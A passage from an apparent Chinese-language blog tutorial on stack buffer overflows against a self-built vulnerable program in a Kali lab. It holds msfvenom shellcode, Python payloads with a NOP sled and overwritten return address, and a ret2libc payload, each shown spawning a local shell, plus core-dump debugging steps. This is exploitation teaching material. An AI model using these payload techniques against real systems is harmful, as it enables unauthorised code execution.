0x402004)<br><span class="hljs-meta"></span><br><span class="hljs-meta">gdb-peda$</span><span class="bash"> x/40xg <span class="hljs-variable">$rsp</span></span><br>0x7fffffffde90: 0x00007fffffffe008      0x0000000200000000                                               <br>0x7fffffffdea0: 0x4141414141414141      0x0000000000000000                                                  <br>0x7fffffffdeb0: 0x0000000000000000      0x0000000000000000<br>0x7fffffffdec0: 0x0000000000000000      0x0000000000000000<br>0x7fffffffded0: 0x0000000000000000      0x00000000004011c5<br>0x7fffffffdee0: 0x0000000000000000      0x0000000000401180<br>0x7fffffffdef0: 0x0000000000000000      0x0000000000401050<br>0x7fffffffdf00: 0x00007fffffffe000      0x0000000000000000<br>0x7fffffffdf10: 0x0000000000000000      0x00007ffff7dfe7fd<br>0x7fffffffdf20: 0x00007fffffffe008      0x00000002f7fca000<br>0x7fffffffdf30: 0x0000000000401136      0x00007fffffffe339<br>0x7fffffffdf40: 0x0000000000401180      0x8c588bd5ae89821a<br>0x7fffffffdf50: 0x0000000000401050      0x0000000000000000<br>0x7fffffffdf60: 0x0000000000000000      0x0000000000000000<br>0x7fffffffdf70: 0x73a7742a10c9821a      0x73a7646a61e5821a<br>0x7fffffffdf80: 0x0000000000000000      0x0000000000000000<br>0x7fffffffdf90: 0x0000000000000000      0x0000000000000002<br>0x7fffffffdfa0: 0x00007fffffffe008      0x00007fffffffe020<br>0x7fffffffdfb0: 0x00007ffff7ffe220      0x0000000000000000<br>0x7fffffffdfc0: 0x0000000000000000      0x0000000000401050<br></code></pre></td></tr></table></figure><p>可以发现，数据是从 0x7fffffffdea0 开始写入的，RBP 为 0x7fffffffdf10 ，可以计算出偏移量为：120 。同时，可以将返回地址设为： 0x7fffffffdea0 </p><p>构造 payload：</p><p>shellcode:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> msfvenom -p linux/x64/<span class="hljs-built_in">exec</span> -f python -b <span class="hljs-string">&quot;\x00\x0a\x09\x20&quot;</span></span><br>[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload<br>[-] No arch selected, selecting arch: x64 from the payload<br>Found 4 compatible encoders<br>Attempting to encode payload with 1 iterations of generic/none<br>generic/none failed with Encoding failed due to a bad character (index=9, char=0x00)<br>Attempting to encode payload with 1 iterations of x64/xor<br>x64/xor succeeded with size 63 (iteration=0)<br>x64/xor chosen with final size 63<br>Payload size: 63 bytes<br>Final size of python file: 318 bytes<br>buf =  b&quot;&quot;<br>buf += b&quot;\x48\x31\xc9\x48\x81\xe9\xfd\xff\xff\xff\x48\x8d\x05&quot;<br>buf += b&quot;\xef\xff\xff\xff\x48\xbb\x70\x9f\x3b\x04\xb2\x3b\x22&quot;<br>buf += b&quot;\x94\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4&quot;<br>buf += b&quot;\x38\x27\x14\x66\xdb\x55\x0d\xe7\x18\x9f\xa2\x54\xe6&quot;<br>buf += b&quot;\x64\x70\xca\x1a\xa4\x63\x0b\xb7\x3b\x22\x94&quot;<br></code></pre></td></tr></table></figure><p>payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">import</span> sys<br><br>buf =  <span class="hljs-string">b&quot;&quot;</span><br>buf += <span class="hljs-string">b&quot;\x48\x31\xc9\x48\x81\xe9\xfd\xff\xff\xff\x48\x8d\x05&quot;</span><br>buf += <span class="hljs-string">b&quot;\xef\xff\xff\xff\x48\xbb\x55\x49\x24\x27\x62\x47\xc7&quot;</span><br>buf += <span class="hljs-string">b&quot;\xa6\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4&quot;</span><br>buf += <span class="hljs-string">b&quot;\x1d\xf1\x0b\x45\x0b\x29\xe8\xd5\x3d\x49\xbd\x77\x36&quot;</span><br>buf += <span class="hljs-string">b&quot;\x18\x95\xf8\x3f\x72\x7c\x28\x67\x47\xc7\xa6&quot;</span><br><br>nopsled = <span class="hljs-string">b&#x27;\x90&#x27;</span> * (<span class="hljs-number">120</span> - <span class="hljs-number">63</span>)<br>rip = <span class="hljs-string">b&#x27;\xa0\xde\xff\xff\xff\x7f&#x27;</span><br><br>sys.stdout.buffer.write(buf+nopsled+rip)<br></code></pre></td></tr></table></figure><p>gdb调试：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">gdb-peda$</span><span class="bash"> run $(python3 d.py)</span><br>Starting program: /home/kali/StackOverflowtest/bol_64 $(python3 d.py)<br>[----------------------------------registers-----------------------------------]<br>RBP: 0x7fffffffdea0 --&gt; 0x9090909090909090 <br>RSP: 0x7fffffffde20 --&gt; 0x7fffffffdf98 --&gt; 0x7fffffffe2e4 (&quot;/home/kali/StackOverflowtest/bol_64&quot;)<br>RIP: 0x40115f (&lt;main+41&gt;:       lea    rax,[rip+0xe9e]        # 0x402004)<br><span class="hljs-meta"></span><br><span class="hljs-meta">gdb-peda$</span><span class="bash"> x/40xg <span class="hljs-variable">$rsp</span></span><br>0x7fffffffde20: 0x00007fffffffdf98      0x0000000200000000<br>0x7fffffffde30: 0xfffde98148c93148      0xffffef058d48ffff<br>0x7fffffffde40: 0x6227244955bb48ff      0x4827583148a6c747<br>0x7fffffffde50: 0x1df4e2fffffff82d      0x3dd5e8290b450bf1<br>0x7fffffffde60: 0x3ff895183677bd49      0x90a6c74767287c72<br>0x7fffffffde70: 0x9090909090909090      0x9090909090909090<br>0x7fffffffde80: 0x9090909090909090      0x9090909090909090<br>0x7fffffffde90: 0x9090909090909090      0x9090909090909090<br>0x7fffffffdea0: 0x9090909090909090      0x00007fffffffdea0<br>0x7fffffffdeb0: 0x00007fffffffdf98      0x00000002f7fca000<br>0x7fffffffdec0: 0x0000000000401136      0x00007fffffffe2c9<br>0x7fffffffded0: 0x0000000000401180      0x604b72b9b6bfe19c<br>0x7fffffffdee0: 0x0000000000401050      0x0000000000000000<br>0x7fffffffdef0: 0x0000000000000000      0x0000000000000000<br>0x7fffffffdf00: 0x9fb48d460bdfe19c      0x9fb49d0679d3e19c<br>0x7fffffffdf10: 0x0000000000000000      0x0000000000000000<br>0x7fffffffdf20: 0x0000000000000000      0x0000000000000002<br>0x7fffffffdf30: 0x00007fffffffdf98      0x00007fffffffdfb0<br>0x7fffffffdf40: 0x00007ffff7ffe220      0x0000000000000000<br>0x7fffffffdf50: 0x0000000000000000      0x0000000000401050<br></code></pre></td></tr></table></figure><p>发现栈发生偏移了，这次数据是从 0x7fffffffde30 开始写入的，修改rip：rip = b’\x30\xde\xff\xff\xff\x7f’</p><p>再次运行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">gdb-peda$</span><span class="bash"> run $(python3 d.py)</span><br>Starting program: /home/kali/StackOverflowtest/bol_64 $(python3 d.py)<br>[----------------------------------registers-----------------------------------]<br>RBP: 0x7fffffffdea0 --&gt; 0x9090909090909090 <br>RSP: 0x7fffffffde20 --&gt; 0x7fffffffdf98 --&gt; 0x7fffffffe2e4 (&quot;/home/kali/StackOverflowtest/bol_64&quot;)<br>RIP: 0x40115f (&lt;main+41&gt;:       lea    rax,[rip+0xe9e]        # 0x402004)<br><span class="hljs-meta"></span><br><span class="hljs-meta">gdb-peda$</span><span class="bash"> x/40xg <span class="hljs-variable">$rsp</span></span><br>0x7fffffffde20: 0x00007fffffffdf98      0x0000000200000000<br>0x7fffffffde30: 0xfffde98148c93148      0xffffef058d48ffff<br>0x7fffffffde40: 0x6227244955bb48ff      0x4827583148a6c747<br>0x7fffffffde50: 0x1df4e2fffffff82d      0x3dd5e8290b450bf1<br>0x7fffffffde60: 0x3ff895183677bd49      0x90a6c74767287c72<br>0x7fffffffde70: 0x9090909090909090      0x9090909090909090<br>0x7fffffffde80: 0x9090909090909090      0x9090909090909090<br>0x7fffffffde90: 0x9090909090909090      0x9090909090909090<br>0x7fffffffdea0: 0x9090909090909090      0x00007fffffffde30<br>0x7fffffffdeb0: 0x00007fffffffdf98      0x00000002f7fca000<br>0x7fffffffdec0: 0x0000000000401136      0x00007fffffffe2c9<br>0x7fffffffded0: 0x0000000000401180      0xc56a50d696c8e814<br>0x7fffffffdee0: 0x0000000000401050      0x0000000000000000<br>0x7fffffffdef0: 0x0000000000000000      0x0000000000000000<br>0x7fffffffdf00: 0x3a95af292ba8e814      0x3a95bf6959a4e814<br>0x7fffffffdf10: 0x0000000000000000      0x0000000000000000<br>0x7fffffffdf20: 0x0000000000000000      0x0000000000000002<br>0x7fffffffdf30: 0x00007fffffffdf98      0x00007fffffffdfb0<br>0x7fffffffdf40: 0x00007ffff7ffe220      0x0000000000000000<br>0x7fffffffdf50: 0x0000000000000000      0x0000000000401050<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> c</span><br>Continuing.<br>Done!<br>process 3996 is executing new program: /usr/bin/dash<br>Error in re-setting breakpoint 1: No source file named /home/kali/StackOverflowtest/bol.c.<br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">exit</span></span><br>[Inferior 1 (process 3996) exited normally]<br>Warning: not running<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> quit</span><br></code></pre></td></tr></table></figure><p>查看 payload 在栈中的情况，这次没问题了，成功得到一个 shell。</p><p>尝试在 shell 中执行程序：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">─$ ./bol_64 $(python3 d.py)<br>Done!<br>zsh: segmentation fault  ./bol_64 $(python3 d.py)<br></code></pre></td></tr></table></figure><p>不出所料，失败了，直接通过 core dump 方式查找真是返回地址：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">ulimit</span> -c unlimited</span><br><span class="hljs-meta">$</span><span class="bash"> sudo sh -c <span class="hljs-string">&#x27;echo &quot;/tmp/core.%t&quot; &gt; /proc/sys/kernel/core_pattern&#x27;</span></span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> ./bol_64 $(python3 d.py)</span><br>Done!<br>zsh: segmentation fault (core dumped)  ./bol_64 $(python3 d.py)<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> ls /tmp</span><br>core.1657191791   core.1657191862   core.1657191889   core.1657192242   core.1657192417<br>                                                                                                       <br><span class="hljs-meta">$</span><span class="bash"> gdb -q vuln /tmp/core.1657192417</span><br>vuln: No such file or directory.<br>[New LWP 1667]<br>Core was generated by `./bol_64 H1�H������H�����H�UI$&#x27;bGǦH1X&#x27;H-�������<br>                                                                      E<br>                                                                       )��=I�w6▒��?r|(gGǦ�������&#x27;.<br>Program terminated with signal SIGSEGV, Segmentation fault.<br><span class="hljs-meta">#</span><span class="bash">0  0x00007fffffffde32 <span class="hljs-keyword">in</span> ?? ()</span><br><span class="hljs-meta">gdb-peda$</span><span class="bash"> x/40xg 0x00007fffffffde30</span><br>0x7fffffffde30: 0x0000000000402004      0x00007ffff7e4cf8a<br>0x7fffffffde40: 0x0000000000401180      0x00007fffffffdef0<br>0x7fffffffde50: 0x0000000000401050      0x0000000000000000<br>0x7fffffffde60: 0x0000000000000000      0x000000000040116e<br>0x7fffffffde70: 0x00007fffffffdfe8      0x0000000200000000<br>0x7fffffffde80: 0xfffde98148c93148      0xffffef058d48ffff<br>0x7fffffffde90: 0x6227244955bb48ff      0x4827583148a6c747<br>0x7fffffffdea0: 0x1df4e2fffffff82d      0x3dd5e8290b450bf1<br>0x7fffffffdeb0: 0x3ff895183677bd49      0x90a6c74767287c72<br>0x7fffffffdec0: 0x9090909090909090      0x9090909090909090<br>0x7fffffffded0: 0x9090909090909090      0x9090909090909090<br>0x7fffffffdee0: 0x9090909090909090      0x9090909090909090<br>0x7fffffffdef0: 0x9090909090909090      0x00007fffffffde30<br>0x7fffffffdf00: 0x00007fffffffdfe8      0x00000002f7fca000<br>0x7fffffffdf10: 0x0000000000401136      0x00007fffffffe309<br>0x7fffffffdf20: 0x0000000000401180      0xc2c83e1e466f4ea0<br>0x7fffffffdf30: 0x0000000000401050      0x0000000000000000<br>0x7fffffffdf40: 0x0000000000000000      0x0000000000000000<br>0x7fffffffdf50: 0x3d37c1e1f86f4ea0      0x3d37d1a189034ea0<br>0x7fffffffdf60: 0x0000000000000000      0x0000000000000000<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> quit</span><br></code></pre></td></tr></table></figure><p>发现运行时 shellcode 的开始地址变成了 0x7fffffffde80，修改 payload：rip = b’\x80\xde\xff\xff\xff\x7f’</p><p>再次运行成功得到 shell：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ./bol_64 $(python3 d.py)</span><br>Done!<br><span class="hljs-meta">$</span><span class="bash"> whoami</span><br>kali<br><span class="hljs-meta">$</span><span class="bash"> id</span><br>uid=1000(kali) gid=1000(kali) groups=1000(kali),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),117(bluetooth),120(wireshark),134(scanner),142(kaboxer)<br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">exit</span></span><br></code></pre></td></tr></table></figure><h2 id="ret-to-libc："><a href="#ret-to-libc：" class="headerlink" title="ret to libc："></a>ret to libc：</h2><blockquote><p>这里使用正常的32位bol程序</p></blockquote><p>gdb调试：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> gdb -q bol_normal</span><br>Reading symbols from bol_normal...<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> list</span><br>1       #include &lt;string.h&gt;<br>2       #include &lt;stdio.h&gt;<br>3       void main(int argc, char *argv[]) &#123;<br>4           char buffer[100];<br>5           strcpy(buffer, argv[1]);<br>6           printf(&quot;Done!\n&quot;);<br>7       &#125;<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> <span class="hljs-built_in">break</span> 6</span><br>Breakpoint 1 at 0x804846e: file bol.c, line 6.<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> disass main</span><br>Dump of assembler code for function main:<br>   0x0804844d &lt;+0&gt;:     push   ebp<br>   0x0804844e &lt;+1&gt;:     mov    ebp,esp<br>   0x08048450 &lt;+3&gt;:     and    esp,0xfffffff0<br>   0x08048453 &lt;+6&gt;:     add    esp,0xffffff80<br>   0x08048456 &lt;+9&gt;:     mov    eax,DWORD PTR [ebp+0xc]<br>   0x08048459 &lt;+12&gt;:    add    eax,0x4<br>   0x0804845c &lt;+15&gt;:    mov    eax,DWORD PTR [eax]<br>   0x0804845e &lt;+17&gt;:    mov    DWORD PTR [esp+0x4],eax<br>   0x08048462 &lt;+21&gt;:    lea    eax,[esp+0x1c]<br>   0x08048466 &lt;+25&gt;:    mov    DWORD PTR [esp],eax<br>   0x08048469 &lt;+28&gt;:    call   0x8048310 &lt;strcpy@plt&gt;<br>   0x0804846e &lt;+33&gt;:    mov    DWORD PTR [esp],0x8048510<br>   0x08048475 &lt;+40&gt;:    call   0x8048320 &lt;puts@plt&gt;<br>   0x0804847a &lt;+45&gt;:    leave  <br>   0x0804847b &lt;+46&gt;:    ret    <br>End of assembler dump.<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> run AAAA</span><br>Starting program: /home/kali/StackOverflowtest/bol_normal AAAA<br>[----------------------------------registers-----------------------------------]<br>EBP: 0xffffd0d8 --&gt; 0x0 <br>ESP: 0xffffd050 --&gt; 0xffffd06c (&quot;AAAA&quot;)<br>EIP: 0x804846e (&lt;main+33&gt;:      mov    DWORD PTR [esp],0x8048510)<br><span class="hljs-meta"></span><br><span class="hljs-meta">gdb-peda$</span><span class="bash"> x/40x <span class="hljs-variable">$esp</span></span><br>0xffffd050:     0xffffd06c      0xffffd377      0xf7ffd9d0      0x00000000<br>0xffffd060:     0x00000000      0x00000000      0x00000000      0x41414141<br>0xffffd070:     0x00000000      0x00000000      0xf7ffd000      0x00000000<br>0xffffd080:     0x08048350      0xf7fc9550      0x08048034      0xf7fa8a08<br>0xffffd090:     0x00000002      0xf7fdc480      0x00000000      0x080482dd<br>0xffffd0a0:     0xf7fa73fc      0xffffffff      0x0804a000      0x080484d2<br>0xffffd0b0:     0x00000002      0xffffd184      0xffffd190      0xf7df39d5<br>0xffffd0c0:     0xf7fdc480      0x00000000      0x0804848b      0x00000000<br>0xffffd0d0:     0x00000002      0x08048350      0x00000000      0xf7dda905<br>0xffffd0e0:     0x00000002      0xffffd184      0xffffd190      0xffffd114<br></code></pre></td></tr></table></figure><p>可以看到输入点是 0xffffd06c，ebp 是 0xffffd0d8，可得偏移为：112</p><p>查找 system 函数和字符串 “/bin/sh” 的地址：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">gdb-peda$</span><span class="bash"> p system</span><br><span class="hljs-meta">$</span><span class="bash">2 = &#123;&lt;text variable, no debug info&gt;&#125; 0xf7e00cc0 &lt;system&gt;</span><br><span class="hljs-meta">gdb-peda$</span><span class="bash"> searchmem <span class="hljs-string">&quot;/bin/sh&quot;</span></span><br>Searching for &#x27;/bin/sh&#x27; in: None ranges<br>Found 1 results, display max 1 items:<br>libc : 0xf7f4bb62 (&quot;/bin/sh&quot;)<br></code></pre></td></tr></table></figure><p>构造payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">import</span> sys<br><br>padding = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">112</span><br>system = <span class="hljs-string">b&#x27;\xc0\x0c\xe0\xf7&#x27;</span><br>bin_sh = <span class="hljs-string">b&#x27;\x62\xbb\xf4\xf7&#x27;</span><br><br>payload = padding + system + <span class="hljs-string">b&quot;AAAA&quot;</span> + bin_sh<br><br>sys.stdout.buffer.write(payload)<br></code></pre></td></tr></table></figure><p>再次运行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">gdb-peda$</span><span class="bash"> run $(python3 e.py)</span><br>Starting program: /home/kali/StackOverflowtest/bol_normal $(python3 e.py)<br>[----------------------------------registers-----------------------------------]<br>EBP: 0xffffd068 (&quot;AAAA\300\f\340\367AAAAb\273\364&quot;, &lt;incomplete sequence \367&gt;)<br>ESP: 0xffffcfe0 --&gt; 0xffffcffc (&#x27;A&#x27; &lt;repeats 112 times&gt;, &quot;\300\f\340\367AAAAb\273\364&quot;, &lt;incomplete sequence \367&gt;)<br>EIP: 0x804846e (&lt;main+33&gt;:      mov    DWORD PTR [esp],0x8048510)<br><span class="hljs-meta"></span><br><span class="hljs-meta">gdb-peda$</span><span class="bash"> x/40x <span class="hljs-variable">$esp</span></span><br>0xffffcfe0:     0xffffcffc      0xffffd2ff      0xf7ffd9d0      0x00000000<br>0xffffcff0:     0x00000000      0x00000000      0x00000000      0x41414141<br>0xffffd000:     0x41414141      0x41414141      0x41414141      0x41414141<br>0xffffd010:     0x41414141      0x41414141      0x41414141      0x41414141<br>0xffffd020:     0x41414141      0x41414141      0x41414141      0x41414141<br>0xffffd030:     0x41414141      0x41414141      0x41414141      0x41414141<br>0xffffd040:     0x41414141      0x41414141      0x41414141      0x41414141<br>0xffffd050:     0x41414141      0x41414141      0x41414141      0x41414141<br>0xffffd060:     0x41414141      0x41414141      0x41414141      0xf7e00cc0<br>0xffffd070:     0x41414141      0xf7f4bb62      0xffffd100      0xffffd0a4<br></code></pre></td></tr></table></figure><p>查看 payload 写入情况，没什么问题，继续运行，得到 shell：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">gdb-peda$</span><span class="bash"> c</span><br>Continuing.<br>Done!<br>[Attaching after process 2448 vfork to child process 2453]<br>[New inferior 2 (process 2453)]<br>[Detaching vfork parent process 2448 after child exec]<br>[Inferior 1 (process 2448) detached]<br>process 2453 is executing new program: /usr/bin/dash<br>Error in re-setting breakpoint 1: No source file named /home/kali/StackOverflowtest/bol.c.<br>[Attaching after process 2453 vfork to child process 2454]<br>[New inferior 3 (process 2454)]<br>[Detaching vfork parent process 2453 after child exec]<br>[Inferior 2 (process 2453) detached]<br>process 2454 is executing new program: /usr/bin/dash<br><span class="hljs-meta">$</span><span class="bash"> </span>   <br><span class="hljs-meta">$</span><span class="bash"> whoami</span><br>[Attaching after process 2454 vfork to child process 2455]<br>[New inferior 4 (process 2455)]<br>[Detaching vfork parent process 2454 after child exec]<br>[Inferior 3 (process 2454) detached]<br>process 2455 is executing new program: /usr/bin/whoami<br>kali<br>[Inferior 4 (process 2455) exited normally]<br><span class="hljs-meta">$</span><span class="bash"> Warning: not running</span><br>zsh: suspended (tty output)  gdb -q bol_normal<br></code></pre></td></tr></table></figure><p>shell 中运行也成功得到 shell：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ./bol_normal $(python3 e.py)</span><br>Done!<br><span class="hljs-meta">$</span><span class="bash"> whoami</span><br>kali<br><span class="hljs-meta">$</span><span class="bash"> id</span><br>uid=1000(kali) gid=1000(kali) groups=1000(kali),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),117(bluetooth),120(wireshark),134(scanner),142(kaboxer)<br><span class="hljs-meta">$</span><span class="bash"> exiy</span><br>/bin/sh: 3: exiy: not found<br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">exit</span></span><br>zsh: segmentation fault  ./bol_normal $(python3 e.py)<br></code></pre></td></tr></table></figure><h2 id="Others"><a href="#Others" class="headerlink" title="Others"></a>Others</h2><h3 id="EIP"><a href="#EIP" class="headerlink" title="EIP"></a>EIP</h3><p><strong>1、修改 gdb 环境变量</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> 删除 LINES 和 COLUMNS 变量</span><br><span class="hljs-meta">$</span><span class="bash"> show environment</span><br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">unset</span> environment LINES</span> <br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">unset</span> environment COLUMNS</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 统一环境</span><br><span class="hljs-meta">#</span><span class="bash"> 无环境变量启动，只有 LINES 和 COLUMNS 变量，可以进行删除</span><br><span class="hljs-meta">$</span><span class="bash"> env - gdb /home/kali/StackOverflowtest/bol</span><br><span class="hljs-meta">$</span><span class="bash"> env - /home/kali/StackOverflowtest/bol</span><br></code></pre></td></tr></table></figure><p><strong>2、通过 core dump 的方式获取真实的地址：</strong></p><blockquote><p>原文链接：<a href="https://blog.csdn.net/bitsec/article/details/81026447">https://blog.csdn.net/bitsec/article/details/81026447</a></p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> 产生 core 文件，就是程序运行发生段错误时的文件。写入错误的 ret_addr，导致程序错误，会得到 core 文件，然后通过调试 core 文件找到正确的 buf 的其实地址。</span><br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">ulimit</span> -c 